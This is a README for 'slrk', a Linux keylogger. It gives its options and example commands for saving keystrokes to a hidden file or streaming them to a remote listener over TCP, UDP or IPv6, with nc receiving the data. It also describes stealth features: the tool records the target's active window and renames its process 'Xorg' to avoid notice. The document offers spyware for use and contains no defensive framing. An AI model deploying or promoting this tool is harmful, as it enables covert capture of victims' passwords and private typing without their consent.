# Simple_Local&Remote_Keylogger

DESCRIPTION:<br>

Simple keylogger that runs on Linux.<br>
It must be run as root.

__________________________________________________________________________
Usage: #./slrk [OPTIONS]<br>
<br>
OPTIONS:<br>
	-d \<input-device\>:  if not specified, the default device is '/dev/input/by-path/***kbd'<br>
	-o \<output-file\>:   it can be used only if '-m remote' option is not specified. The default output file is '/tmp/.logger.txt'<br>
	-m remote -a \<IP-ADDR\> -p \<PORT\>: it sends all the keystrokes on the remote server located at \<IP-ADDR:PORT\><br>
<br>
EXAMPLE:<br><br>
---It works with both TCP and UDP---<br><br>
[TCP]<br>
Server$ nc -lvp 8888 > logger.txt<br>
Client#./slrk -m remote -a 127.0.0.1 -p 8888<br><br>
[UDP] <br>
Server$ nc -u -lvp 8888 > logger.txt<br>
Client#./slrk -m remote -a 127.0.0.1 -p 8888<br><br>
---It works with ipv6 too--- <br><br>
Server$ nc -6 -lvp 8888 > logger.txt<br>
Client#./slrk -m remote -a ::1 -p 8888
__________________________________________________________________________
<br>(It shows the active window on which the target is writing)
<br>(Keys are mapped on English keyboard)
<br>(It shows the keyboard layout (e.g.: us, it, colemak, etc..))  
(Process name is renamed as "Xorg")
